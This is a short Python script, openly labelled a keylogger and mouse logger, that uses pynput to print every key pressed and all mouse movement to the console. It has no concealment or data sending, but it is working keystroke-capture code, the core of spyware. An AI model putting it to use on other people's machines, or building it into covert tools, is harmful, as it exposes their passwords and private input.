####A simple keylogger and mouse logger. Prints output in command line when running. 

from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener

def on_move(x,y):
    print(x,y)

mouse_listener = MouseListener(on_move=on_move)
mouse_listener.start()

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

with KeyboardListener(on_press=on_press) as keyboard_listener:
    keyboard_listener.join()


